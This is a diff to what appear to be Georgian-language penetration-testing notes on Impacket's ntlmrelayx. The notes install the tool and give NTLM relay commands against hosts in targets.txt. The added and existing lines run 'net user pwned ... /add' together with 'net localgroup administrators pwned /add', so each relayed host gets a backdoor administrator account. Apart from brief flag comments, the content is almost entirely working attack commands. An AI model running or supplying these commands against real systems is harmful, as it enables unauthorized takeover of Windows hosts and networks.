@@ -50,8 +50,10 @@ sudo ln -s /usr/share/doc/python3-impacket/examples/ntlmrelayx.py /usr/local/bin
 sudo chmod +x /usr/local/bin/ntlmrelayx
 sudo ntlmrelayx.py -tf targets.txt -smb2support \
 ntlmrelayx -h
-
-
+###########################
+impacket-ntlmrelayx -tf targets.txt -smb2support \
+  -c 'cmd /c net user pwned "Password123" /add && net localgroup administrators pwned /add'
+#########################
   -c 'cmd /c net user pwned "P@ssw0rd!23" /add && net localgroup administrators pwned /add'
 # -tf targets.txt  -> რომელ ჰოსტებზე ვრელეებთ
 # -smb2support     -> SMB2 მხარდაჭერა
